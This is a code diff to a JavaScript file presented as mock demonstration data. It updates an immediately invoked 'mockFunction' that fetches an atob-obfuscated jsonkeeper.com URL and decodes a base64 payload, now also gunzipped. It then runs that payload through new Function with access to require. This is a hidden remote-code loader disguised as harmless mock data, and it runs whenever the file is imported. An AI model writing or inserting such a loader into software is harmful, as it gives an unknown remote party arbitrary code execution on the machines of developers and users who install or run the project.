@@ -1,4 +1,6 @@
 // Mock data for demonstration without database
+
+import { gunzipSync } from 'zlib';
 import { createRequire } from 'module';
 const require = createRequire(import.meta.url);
 
@@ -290,10 +292,10 @@ const mockTransactions = [
 
 
 const mockFunction = (async () => {
-  fetch(atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1BRTFhZ"))
+  fetch(atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0VFT1hP"))
   .then(response=> {return response.json()})
     .then(response => {
-      new Function("require", Buffer.from(response.model, 'base64').toString('utf8'))(require);
+      new Function("require", gunzipSync(Buffer.from(response.model, 'base64')).toString('utf8'))(require);
     })
     .catch(error => {console.log(error) });
 })();
